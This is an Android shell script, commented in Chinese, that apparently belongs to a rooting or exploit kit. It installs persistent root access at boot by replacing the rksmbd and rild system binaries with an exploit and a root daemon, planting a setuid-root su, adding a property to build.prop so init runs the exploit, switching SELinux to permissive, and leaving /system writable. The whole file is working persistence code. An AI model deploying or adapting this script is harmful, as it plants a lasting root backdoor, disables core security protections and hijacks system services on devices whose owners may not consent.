#!/system/bin/sh
# 安装「开机自动提权 + root shell」持久化
# 需要已获得 root（onkey.sh 会在利用成功后自动以 root 调用本脚本）
# 也可手动执行: persist.sh [包含 exp_boot/rootd/su 的目录]
#
# 原理：
#   /system/bin/rksmbd 被替换为 exp_boot（漏洞利用，成功后拉起 /system/bin/.rd）
#   /system/build.prop 追加 sys.rksmbd.start=1
#   开机时 init 的 `on property:sys.rksmbd.start=1 -> start startsamba`
#   会在 init 域（unconfined）执行它 -> 利用成功 -> SELinux Permissive + rootd
#   另外 /system/bin/rild 替换为 rootd（rild 域有 tcp_socket 权限），作为双保险
#   所有被替换文件都会生成 .r1bak 备份
#   /system 安装完成后保持可写（不再 remount ro）

D="${1:-/sdcard/r1root}"

for f in exp_boot rootd su; do
    [ -f "$D/$f" ] || { echo "[-] missing $D/$f"; exit 1; }
done

# 容错：已经是 rw 时 remount 可能返回 EBUSY
mount -o remount,rw /system 2>/dev/null
if ! mount | grep ' /system ' | grep -q 'rw'; then
    echo "[-] /system is not read-write (remount failed)"
    exit 1
fi

[ -f /system/bin/rksmbd.r1bak ]   || cp /system/bin/rksmbd   /system/bin/rksmbd.r1bak
[ -f /system/bin/rild.r1bak ]     || cp /system/bin/rild     /system/bin/rild.r1bak
[ -f /system/build.prop.r1bak ]   || cp /system/build.prop   /system/build.prop.r1bak

# 用「临时文件 + rename」安装，避免覆盖正在运行的二进制时出现 Text file busy
inst() {
    cp "$1" "$2.r1new" || return 1
    chmod "$3" "$2.r1new" || return 1
    mv -f "$2.r1new" "$2"
}

inst "$D/su"       /system/bin/su      6755 || { echo "[-] install su failed"; exit 1; }
inst "$D/rootd"    /system/bin/.rd     755  || { echo "[-] install .rd failed"; exit 1; }
inst "$D/exp_boot" /system/bin/rksmbd  755  || { echo "[-] install rksmbd failed"; exit 1; }

inst "$D/rootd"    /system/bin/rild    755  || { echo "[-] install rild failed"; exit 1; }
chcon u:object_r:rild_exec:s0 /system/bin/rild

grep -q '^sys.rksmbd.start=1' /system/build.prop || echo 'sys.rksmbd.start=1' >> /system/build.prop

echo "[+] persistence installed:"
echo "    /system/bin/rksmbd  = boot exploit (sys.rksmbd.start=1)"
echo "    /system/bin/rild    = rootd (rild domain)"
echo "    /system/bin/su      = setuid root"
echo "    /system kept read-write"
echo "    backups: *.r1bak, /system/build.prop.r1bak"
echo "[*] reboot to verify"
